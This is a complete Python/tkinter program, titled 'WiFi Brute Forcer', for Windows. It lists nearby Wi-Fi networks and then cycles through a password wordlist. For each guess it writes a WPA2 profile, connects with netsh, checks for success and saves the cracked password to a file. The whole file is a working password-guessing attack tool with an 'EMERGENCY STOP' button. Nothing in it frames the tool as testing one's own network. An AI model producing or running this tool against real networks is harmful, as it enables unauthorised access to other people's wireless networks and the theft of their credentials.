import tkinter as tk
from tkinter import filedialog, scrolledtext, messagebox
import subprocess
import os
import tempfile
import time

# Global stop flag
stop_flag = False

# 🛑 Stop attack function
def stop_attack():
    global stop_flag
    stop_flag = True
    log("🛑 Emergency stop triggered!")

# 📜 Log messages to the output box
def log(message):
    output_box.insert(tk.END, message + "\n")
    output_box.see(tk.END)
    root.update()

# 📶 Get available SSIDs
def get_available_ssids():
    result = subprocess.run('netsh wlan show networks', shell=True, capture_output=True, text=True)
    ssids = []
    for line in result.stdout.splitlines():
        if "SSID" in line and ":" in line:
            ssid = line.split(":", 1)[1].strip()
            if ssid and ssid not in ssids:
                ssids.append(ssid)
    return ssids

# 🧠 Browse for wordlist or generator
def browse_file(entry):
    path = filedialog.askopenfilename(title="Select File")
    if path:
        entry.delete(0, tk.END)
        entry.insert(0, path)

# 🔍 Check if connected to the SSID
def is_connected_to(ssid):
    result = subprocess.run('netsh wlan show interfaces', shell=True, capture_output=True, text=True)
    lines = result.stdout.splitlines()

    state_connected = False
    ssid_match = False

    for line in lines:
        line_lower = line.lower()

        if "state" in line_lower:
            if "connected" in line_lower:
                state_connected = True
            else:
                state_connected = False  # If State is found but not connected, stop here
                break

        if "ssid" in line_lower and ssid.lower() in line_lower:
            ssid_match = True

    return state_connected and ssid_match

# 🚀 Start brute-force
def try_passwords():
    global stop_flag
    stop_flag = False

    ssid = ssid_var.get()
    wordlist_path = wordlist_entry.get()
    generator_path = generator_entry.get()

    if not ssid or not os.path.exists(wordlist_path):
        messagebox.showerror("Missing Info", "You Blind or Somethin' It is invalid")
        return

    # Disconnect before starting
    subprocess.run('netsh wlan disconnect', shell=True)

    # Load passwords
    with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
        passwords = [line.strip() for line in f if line.strip()]

    profile_template = f"""
    <WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
      <name>{ssid}</name>
      <SSIDConfig>
        <SSID>
          <name>{ssid}</name>
        </SSID>
      </SSIDConfig>
      <connectionType>ESS</connectionType>
      <connectionMode>manual</connectionMode>
      <MSM>
        <security>
          <authEncryption>
            <authentication>WPA2PSK</authentication>
            <encryption>AES</encryption>
            <useOneX>false</useOneX>
          </authEncryption>
          <sharedKey>
            <keyType>passPhrase</keyType>
            <protected>false</protected>
            <keyMaterial>{{password}}</keyMaterial>
          </sharedKey>
        </security>
      </MSM>
    </WLANProfile>
    """

    for password in passwords:
        if stop_flag:
            log("❌ Attack stopped.")
            return

        log(f"🔑 Trying: {password}")

        # Write temp XML profile
        profile_data = profile_template.replace("{password}", password)
        with tempfile.NamedTemporaryFile("w", delete=False, suffix=".xml") as tmp:
            tmp.write(profile_data)
            temp_profile_path = tmp.name

        subprocess.run(f'netsh wlan delete profile name="{ssid}"', shell=True)
        subprocess.run(f'netsh wlan add profile filename="{temp_profile_path}"', shell=True)
        subprocess.run(f'netsh wlan connect name="{ssid}"', shell=True)

        os.remove(temp_profile_path)

        # Wait a moment to let it connect
        time.sleep(7) 
        if is_connected_to(ssid):
            log(f"✅ Password FOUND: {password}")
            with open("found_password.txt", "w") as out_file:
                out_file.write(password)
            return
        else:
            log("❌ Incorrect")

    log("⚠️ No password matched.")

    if generator_path and os.path.exists(generator_path):
        log("⚙️ Running password generator...")
        subprocess.run(f'python "{generator_path}"', shell=True)
        log("🔁 Generator complete. Please rerun.")

# 🧠 Update SSID list
def refresh_ssids():
    ssids = get_available_ssids()
    if not ssids:
        messagebox.showerror("Error", "No Wi-Fi networks found.")
    ssid_menu['menu'].delete(0, 'end')
    for s in ssids:
        ssid_menu['menu'].add_command(label=s, command=tk._setit(ssid_var, s))
    if ssids:
        ssid_var.set(ssids[0])

# ================= GUI =================
root = tk.Tk()
root.title("WiFi Brute Forcer")
root.geometry("700x500")
root.configure(bg="black")

style = {
    "bg": "black",
    "fg": "lime",
    "font": ("Consolas", 10)
}

tk.Label(root, text="Select SSID:", **style).pack(anchor='w', padx=10, pady=(10, 0))
ssid_var = tk.StringVar()
ssid_menu = tk.OptionMenu(root, ssid_var, [])
ssid_menu.configure(bg="black", fg="lime", font=("Consolas", 10))
ssid_menu.pack(fill='x', padx=10)
tk.Button(root, text="Refresh", command=refresh_ssids, bg="blue", fg="white").pack(padx=10, pady=5)

tk.Label(root, text="Wordlist:", **style).pack(anchor='w', padx=10)
wordlist_entry = tk.Entry(root, bg="black", fg="lime", insertbackground="lime", font=("Consolas", 10))
wordlist_entry.pack(fill='x', padx=10)
tk.Button(root, text="folder", command=lambda: browse_file(wordlist_entry)).pack(padx=10, pady=5)

tk.Label(root, text="(Optional) PassGEN:", **style).pack(anchor='w', padx=10)
generator_entry = tk.Entry(root, bg="black", fg="lime", insertbackground="lime", font=("Consolas", 10))
generator_entry.pack(fill='x', padx=10)
tk.Button(root, text="search", command=lambda: browse_file(generator_entry)).pack(padx=10, pady=5)

tk.Button(root, text="Start Brute Force", command=try_passwords, bg="green", fg="black", font=("Consolas", 12)).pack(fill='x', padx=10, pady=10)
tk.Button(root, text="EMERGENCY STOP", command=stop_attack, bg="black", fg="red", font=("Consolas", 14)).pack(fill='x', padx=10, pady=5)

output_box = scrolledtext.ScrolledText(root, bg="black", fg="lime", font=("Consolas", 10))
output_box.pack(fill='both', expand=True, padx=10, pady=10)

refresh_ssids()
root.mainloop()
